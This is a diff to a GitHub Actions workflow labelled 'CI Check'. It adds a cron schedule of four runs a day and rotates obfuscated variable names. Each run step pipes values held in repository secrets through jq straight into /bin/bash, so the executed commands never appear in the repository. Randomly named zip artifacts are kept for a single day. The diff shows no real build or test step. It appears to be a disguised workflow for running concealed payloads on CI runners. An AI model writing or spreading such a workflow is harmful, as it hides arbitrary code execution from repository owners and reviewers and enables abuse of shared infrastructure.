@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,19 +20,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          ecp6: ${{ secrets.ecp6 }}
+          cng4536: ${{ secrets.cng4536 }}
         run: |
-          printf '%s' "$ecp6" | jq -r .nmg083 | /bin/bash
-          echo $zxpp3 | jq -r .svdx7 | /bin/bash
-          printf '%s' "$bp97" | jq -r .nv59 | /bin/bash
-          echo $vym0 | jq -r .f04 | /bin/bash
-          echo $afwtv4 | jq -r .sbmkd58 | /bin/bash
-          printf '%s' "$qjgg253" | jq -r .d54 | /bin/bash
+          printf '%s' "$cng4536" | jq -r .tzxv2 | /bin/bash
+          printf '%s' "$qw36" | jq -r .pycw1 | /bin/bash
+          echo $yhs978 | jq -r .scc3 | /bin/bash
+          echo $jdbin8563 | jq -r .i56335 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: qqyTwj8R
+          name: fkyojoAl
           path: "*.zip"
           retention-days: 1
